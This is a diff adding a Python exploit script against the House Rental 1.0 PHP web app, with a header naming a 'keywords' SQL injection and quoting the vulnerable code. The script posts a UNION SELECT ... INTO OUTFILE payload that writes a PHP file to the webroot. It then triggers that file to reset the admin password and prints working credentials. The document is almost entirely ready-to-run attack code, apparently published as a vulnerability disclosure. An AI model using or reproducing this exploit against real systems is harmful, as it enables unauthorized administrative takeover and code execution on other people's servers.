@@ -1,0 +1,94 @@
+# Exploit Title: House Rental 1.0 - 'keywords' SQL Injection
+# Exploit Author: Bobby Cooke (boku) & Adeeb Shah (@hyd3sec) 
+# Date: 2020-08-07
+# Vendor Homepage: https://projectworlds.in
+# Software Link: https://projectworlds.in/wp-content/uploads/2019/06/home-rental.zip
+# Version: 1.0
+# Tested On: Windows 10 Pro (x64_86) + XAMPP | Python 2.7
+# CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
+# OWASP Top Ten 2017: A1:2017-Injection
+# CVSS Base Score: 10.0 | Impact Subscore: 6.0 | Exploitability Subscore: 3.9
+# CVSS Vector: AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+# Vulnerability Description:
+#   House Rental v1.0 suffers from an unauthenticated SQL Injection vulnerability allowing remote attackers
+#   to execute arbitrary code on the hosting webserver via sending a malicious POST request.
+# Vulnerable Source Code:
+# /config/config.php
+#   11  try {
+#   12     $connect = new PDO("mysql:host=".dbhost."; dbname=".dbname, dbuser, dbpass);
+#   13     $connect->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+# /index.php
+#    5   if(isset($_POST['search'])) {
+#    7     $keywords = $_POST['keywords'];
+#   11     $keyword = explode(',', $keywords);
+#   12     $concats = "(";
+#   13     $numItems = count($keyword);
+#   15     foreach ($keyword as $key => $value) {
+#   17       if(++$i === $numItems){
+#   18          $concats .= "'".$value."'";
+#   19       }else{
+#   20         $concats .= "'".$value."',";
+#   23     $concats .= ")";
+#   47         $stmt = $connect->prepare("SELECT * FROM room_rental_registrations_apartment WHERE country IN $concats OR country IN $loc OR state IN $concats OR state IN $loc OR city IN $concats OR city IN $loc OR address IN $concats OR address IN $loc OR rooms IN $concats OR landmark IN $concats OR landmark IN $loc OR rent IN $concats OR deposit IN $concats");
+#   48         $stmt->execute();
+
+import requests, sys, re, json
+from colorama import Fore, Back, Style
+
+requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
+F = [Fore.RESET,Fore.BLACK,Fore.RED,Fore.GREEN,Fore.YELLOW,Fore.BLUE,Fore.MAGENTA,Fore.CYAN,Fore.WHITE]
+S = [Style.RESET_ALL,Style.DIM,Style.NORMAL,Style.BRIGHT]
+ok   = S[3]+F[2]+')'+F[5]+'+++'+F[2]+'['+F[8]+'========> '+S[0]+F[0]
+err  = S[3]+F[2]+'<========'+F[2]+'('+F[5]+'+++'+F[2]+'( '+F[0]+S[0]
+
+
+def sig():
+    SIG  = F[2]+"    .-----.._       ,--.              "+F[5]+"  .__              .__________\n"
+    SIG += F[2]+"    |  ..    >  "+F[4]+"___"+F[2]+" |  | .--.         "+F[5]+"  |  |__ ___.__. __| _\\_____  \\  ______ ____  ____\n"
+    SIG += F[2]+"    |  |.'  ,'"+F[4]+"-'"+F[2]+"* *"+F[4]+"'-."+F[2]+" |/  /__   __   "+F[5]+"  |  |  <   |  |/ __ |  _(__  < /  ____/ __ _/ ___\\\n"
+    SIG += F[2]+"    |      <"+F[4]+"/ "+F[2]+"*  *  *"+F[4]+" \\   "+F[2]+"/   \\/   \\  "+F[5]+"  |   Y  \\___  / /_/ | /       \\\\___ \\\\  ___\\  \\___\n"
+    SIG += F[2]+"    |  |>   )   "+F[2]+"* *"+F[4]+"   /    "+F[2]+"\\        \\ "+F[5]+"  |___|  / ____\____ |/______  /____  >\\___  \\___  >\n"
+    SIG += F[2]+"    |____..- "+F[4]+"'-.._..-'"+F[2]+"_|\\___|._..\\___\\"+F[5]+"       \\/\\/         \\/       \\/     \\/     \\/    \\/\n"
+    SIG += F[2]+"        "+F[2]+"_______github.com/boku7_____  "+F[5]+"         _______github.com/hyd3sec____\n_"+F[0]+S[0]
+    return SIG
+
+
+
+def header():
+    head = S[3]+F[2]+'       ---  House Rental v1.0 | SQL Injection - Change Admin Password ---\n'+S[0]
+    return head
+
+def formatHelp(STRING):
+    return S[3]+F[2]+STRING+S[0]
+
+if __name__ == "__main__":
+    print(header())
+    print(sig())
+    if len(sys.argv) != 2:
+        print(err+formatHelp("Usage:\t python %s <WEBAPP_URL>" % sys.argv[0]))
+        print(err+formatHelp("Example:\t python %s 'http://172.16.65.130/home-rental/'" % sys.argv[0]))
+        sys.exit(-1)
+    SERVER_URL  = sys.argv[1]
+    if not re.match(r".*/$", SERVER_URL):
+        SERVER_URL = SERVER_URL+'/'
+    INDEX_URL   = SERVER_URL + 'index.php'
+    EXECUTE_URL = SERVER_URL + 'execute.php'
+    LOGIN_URL   = SERVER_URL + 'auth/login.php'
+    s = requests.Session()
+    get_session = s.get(INDEX_URL, verify=False) 
+    pdata       = {'keywords':'1337\') UNION SELECT all \'1,UPDATED,ADMIN,PASSWORD,TO,boku,aaaaaa,city,landmark,rent,deposit,plotnum,apartName,aptNum,rooms,floor,purpose,own,area,address,accomd,<?php require "config/config.php";$stmt=$connect->prepare("UPDATE users set password=\\\'17d8e2e8233d9a6ae428061cb2cdf226\\\' WHERE username=\\\'admin\\\'");$stmt->execute();?>,image,open,other,1,2020-08-01 14:42:11,2020-08-01 14:42:11,1\' into OUTFILE \'../../htdocs/home-rental/execute.php\' -- boku', 'location':'','search':'search'}
+    SQLi        = s.post(url=INDEX_URL, data=pdata, verify=False)
+    if SQLi.status_code == 200:
+        print(ok+"Sent "+F[2]+S[3]+"SQL Injection"+F[0]+S[0]+" POST Request to "+F[5]+S[3]+INDEX_URL+F[0]+S[0]+" with "+F[2]+S[2]+"payload"+F[0]+S[0]+":")
+        print(S[3]+F[2]+json.dumps(pdata, sort_keys=True, indent=4)+F[0]+S[0])
+    else:
+        print(err+'Cannot send payload to webserver.')
+        sys.exit(-1)
+    try:
+        print(ok+"Executing "+F[2]+S[3]+"SQL Injection"+F[0]+S[0]+" payload to change "+F[2]+S[2]+"admin password"+F[0]+S[0])
+        EXECUTE     = s.get(url=EXECUTE_URL, verify=False)
+    except:
+        print(err+'Failed to connect to '++F[2]+S[3]+EXECUTE_URL+F[0]+S[0]+'to execute payload')
+        sys.exit(-1)
+    print(ok+F[2]+S[3]+"SQL Injection payload executed!"+F[0]+S[0])
+    print(ok+F[2]+S[3]+"Login at "+F[5]+S[3]+LOGIN_URL+F[0]+S[0]+" with creds: "+F[2]+S[2]+"admin:boku"+F[0]+S[0])
